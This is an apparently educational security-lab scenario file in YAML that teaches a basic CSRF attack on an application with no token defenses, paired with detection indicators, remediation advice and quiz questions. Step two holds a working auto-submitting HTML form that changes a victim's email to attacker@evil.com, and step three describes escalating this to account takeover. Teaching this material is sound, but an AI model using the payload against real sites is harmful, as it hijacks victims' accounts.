@@ -1,0 +1,101 @@
+# Category: Cross-Site Request Forgery (CSRF)
+name: "CSRF vulnerability with no defenses"
+id: "csrf-no-defenses-001"
+category: "csrf"
+subcategory: "basic"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers CSRF vulnerabilities where the target application has
+  no CSRF protections in place. The attacker can craft a malicious page that
+  automatically submits a request (e.g., email change, password reset) using
+  the victim's existing session. The request succeeds without any token
+  validation because the application only relies on session cookies.
+
+learning_objectives:
+  - Understand CSRF attacks and their impact
+  - Identify applications with no CSRF protections
+  - Craft a simple HTML form with auto-submission
+  - Perform state-changing actions on behalf of the victim
+
+tools:
+  - Burp Suite
+  - curl
+  - Basic HTML
+
+prerequisites:
+  - Target application with state-changing functionality
+  - Victim has an active session
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify state-changing requests without CSRF tokens"
+    commands:
+      - "# Intercept a request that changes state (email, password, profile)"
+      - "# Look for absence of CSRF tokens in the request"
+    expected_output: "Request identified with no CSRF protection"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Create a malicious HTML page"
+    commands:
+      - "# HTML form with auto-submit:"
+      - "<html><body>"
+      - "<form id='x' action='https://target.com/change-email' method='POST'>"
+      - "<input type='hidden' name='email' value='attacker@evil.com'>"
+      - "</form>"
+      - "<script>document.getElementById('x').submit();</script>"
+      - "</body></html>"
+    expected_output: "When victim visits the page, their email is changed"
+    detection: "Application logs show the email change"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Escalate to account takeover"
+    commands:
+      - "# Use the same technique for password reset or admin actions"
+      - "# If email changed, request password reset to gain control"
+    expected_output: "Full account takeover"
+    detection: "Security alerts for account changes"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1204"
+    description: "User Execution"
+  - standard: "OWASP"
+    control: "A01:2021"
+    description: "Broken Access Control"
+
+detection:
+  network_indicators:
+    - "Requests with no anti-CSRF tokens"
+  log_indicators:
+    - "Sensitive state-changing actions from new IPs"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Implement anti-CSRF tokens for all state-changing operations"
+    - "Use SameSite cookies (Lax or Strict)"
+  long_term:
+    - "Implement double-submit cookies"
+    - "Use a CSRF protection library/framework"
+
+variables:
+  target_url: "https://target.com/change-email"
+  new_email: "attacker@evil.com"
+
+assessment_questions:
+  - "What is CSRF and how does it differ from XSS?"
+  - "Why does the application accept the request without a token?"
+  - "How can you prevent CSRF attacks?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/csrf"
+    title: "OWASP CSRF"
+  - url: "https://portswigger.net/web-security/csrf"
+    title: "PortSwigger CSRF"
